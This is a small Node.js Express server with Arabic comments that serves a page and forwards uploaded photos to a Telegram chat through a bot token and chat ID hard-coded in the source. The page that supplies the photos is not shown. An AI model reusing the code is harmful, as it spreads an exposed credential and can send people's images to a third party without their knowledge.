const express = require("express");
const multer = require("multer");
const axios = require("axios");
const FormData = require("form-data");
const path = require("path");

const app = express();
const upload = multer();

// ⚠️ ضع هنا بيانات البوت
const BOT_TOKEN = "7056698579:AAFuDwSVHizm1OxB9C-8ocaZyyQIsJYHevc";
const CHAT_ID = "7057346640";

// عرض الصفحة
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// استقبال الصورة وإرسالها للتليجرام
app.post("/send", upload.single("photo"), async (req, res) => {
  try {
    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", req.file.buffer, { filename: "photo.jpg", contentType: "image/jpeg" });

    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, { headers: form.getHeaders() });

    res.send("تم الإرسال ✅");
  } catch (err) {
    console.error(err);
    res.status(500).send("خطأ في الإرسال");
  }
});

app.listen(3000, () => console.log("Server running on http://localhost:3000"));
